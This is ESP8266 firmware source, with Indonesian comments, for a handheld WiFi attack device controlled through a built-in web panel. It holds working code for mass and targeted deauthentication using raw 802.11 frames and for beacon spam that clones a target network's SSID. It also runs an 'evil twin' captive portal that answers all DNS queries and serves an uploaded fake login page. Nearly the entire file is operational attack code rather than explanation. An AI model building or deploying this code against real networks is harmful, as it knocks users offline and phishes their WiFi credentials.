#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <FS.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include "web_index.h"

extern "C" {
  #include "user_interface.h"
}

// Konfigurasi Display
Adafruit_SSD1306 display(64, 48, &Wire, -1);
ESP8266WebServer server(80);
DNSServer dnsServer;
File fsUploadFile;

// Variabel Global
String adminSSID="GMpro87", adminPW="Sangkur87", packetLog="", activeEtPage="/etwin1.html";
bool isMassKill=false, isDeauth=false, isSpam=false, isEvil=false;
String targetBSSID="", targetSSID="";
int targetCh=1, currentCh=1, beaconAmount=10;

// Template Packet Deauth
uint8_t deauthPkt[26] = {
  0xC0, 0x00, 0x3A, 0x01, 
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Transmitter (Target BSSID)
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (Target)
  0x00, 0x00, 0x01, 0x00
};

// Fungsi Kirim Beacon (SSID Palsu)
void sendBeacon(String ssid) {
  uint8_t packet[128] = {
    0x80, 0x00, 0x00, 0x00, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x64, 0x00, 0x31, 0x00, 
    0x00, (uint8_t)ssid.length()
  };
  int pos = 38;
  for (int i = 0; i < (int)ssid.length(); i++) packet[pos++] = ssid[i];
  uint8_t post[] = { 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, (uint8_t)targetCh };
  for (int i = 0; i < (int)sizeof(post); i++) packet[pos++] = post[i];
  wifi_send_pkt_freedom(packet, pos, 0);
}

void parseBytes(const char* str, char sep, uint8_t* bytes, int maxBytes, int base) {
  for (int i = 0; i < maxBytes; i++) {
    bytes[i] = strtoul(str, NULL, base);
    str = strchr(str, sep);
    if (str == NULL || *str == '\0') break;
    str++;
  }
}

void setup() {
  SPIFFS.begin();
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(adminSSID.c_str(), adminPW.c_str());
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", [](){ server.send(200, "text/html", INDEX_HTML); });

  server.on("/scan", [](){
    int n = WiFi.scanNetworks(false, true);
    String j = "[";
    for (int i=0; i<n; i++) {
      j += "{\"s\":\""+WiFi.SSID(i)+"\",\"c\":"+String(WiFi.channel(i))+",\"r\":"+String(2*(WiFi.RSSI(i)+100))+",\"b\":\""+WiFi.BSSIDstr(i)+"\"}";
      if (i<n-1) j+=",";
    }
    j += "]"; server.send(200, "application/json", j);
  });

  server.on("/toggle", [](){
    String m = server.arg("m"), st="OFF";
    if(m=="kill") { isMassKill=!isMassKill; if(isMassKill) st="ON"; }
    else if(m=="deauth") { isDeauth=!isDeauth; if(isDeauth) st="ON"; }
    else if(m=="spam") { isSpam=!isSpam; if(isSpam) st="ON"; }
    else if(m=="evil") { isEvil=!isEvil; if(isEvil) st="ON"; }
    packetLog += "[SYS] " + m + " is " + st + "<br>";
    server.send(200, "text/plain", st);
  });

  server.on("/status", [](){
    String s = "{\"m\":"+String(isMassKill)+",\"d\":"+String(isDeauth)+",\"s\":"+String(isSpam)+",\"e\":"+String(isEvil)+"}";
    server.send(200, "application/json", s);
  });

  server.on("/select", [](){
    targetBSSID = server.arg("b"); targetCh = server.arg("c").toInt(); targetSSID = server.arg("s");
    parseBytes(targetBSSID.c_str(), ':', &deauthPkt[10], 6, 16); 
    parseBytes(targetBSSID.c_str(), ':', &deauthPkt[16], 6, 16); 
    packetLog += "[TARGET] Locked: " + targetSSID + " (Ch:" + String(targetCh) + ")<br>";
    server.send(200);
  });

  server.on("/upload", HTTP_POST, [](){ server.send(200); }, [](){
    HTTPUpload& u = server.upload();
    if(u.status == UPLOAD_FILE_START) { fsUploadFile = SPIFFS.open(u.filename.startsWith("/")?u.filename:"/"+u.filename, "w"); }
    else if(u.status == UPLOAD_FILE_WRITE && fsUploadFile) fsUploadFile.write(u.buf, u.currentSize);
    else if(u.status == UPLOAD_FILE_END && fsUploadFile) { fsUploadFile.close(); packetLog += "[FILE] Uploaded: " + u.filename + "<br>"; }
  });

  server.on("/setspam", [](){ beaconAmount = server.arg("n").toInt(); packetLog += "[CFG] Spam Count: " + String(beaconAmount) + "<br>"; server.send(200); });
  server.on("/setetpage", [](){ activeEtPage = server.arg("p"); packetLog += "[CFG] Active Page: " + activeEtPage + "<br>"; server.send(200); });
  server.on("/getlogs", [](){ server.send(200, "text/plain", packetLog); packetLog=""; });

  server.onNotFound([](){
    if (isEvil) {
      File f = SPIFFS.open(activeEtPage, "r");
      if (f) { server.streamFile(f, "text/html"); f.close(); return; }
    }
    server.send(404);
  });

  server.begin();
  wifi_promiscuous_enable(1);
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  
  unsigned long now = millis();
  static unsigned long lastAtk = 0;

  if (now - lastAtk > 100) { // Interval serangan
    lastAtk = now;

    // 1. MASS DEAUTH
    if (isMassKill) {
      currentCh = (currentCh % 13) + 1;
      wifi_set_channel(currentCh);
      uint8_t brc[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
      memcpy(&deauthPkt[4], brc, 6);
      wifi_send_pkt_freedom(deauthPkt, 26, 0);
    }

    // 2. TARGET DEAUTH (Hanya jika Deauth ON)
    if (isDeauth && targetBSSID != "") {
      wifi_set_channel(targetCh);
      for(int i=0; i<3; i++) wifi_send_pkt_freedom(deauthPkt, 26, 0);
      packetLog += "<span style='color:red'>[ATK] Deauth -> " + targetSSID + "</span><br>";
    }

    // 3. BEACON SPAM (Hanya jika Spam ON)
    if (isSpam && targetSSID != "") {
      wifi_set_channel(targetCh);
      for(int i=0; i < beaconAmount; i++) {
        sendBeacon(targetSSID + " " + String(i+1));
      }
      static unsigned long lastSpamLog = 0;
      if(now - lastSpamLog > 2000) {
        packetLog += "<span style='color:cyan'>[SPAM] Broadcasting " + String(beaconAmount) + " SSID clones</span><br>";
        lastSpamLog = now;
      }
    }
  }

  // Update OLED display
  static unsigned long lastOLED = 0;
  if (now - lastOLED > 1000) {
    display.clearDisplay(); display.setCursor(0,0); display.setTextColor(WHITE);
    display.printf("GMpro87\n9u5M4n9\nM:%s D:%s\nS:%s E:%s", 
      isMassKill?"ON":"-", isDeauth?"ON":"-", isSpam?"ON":"-", isEvil?"ON":"-");
    display.display(); lastOLED = now;
  }
}
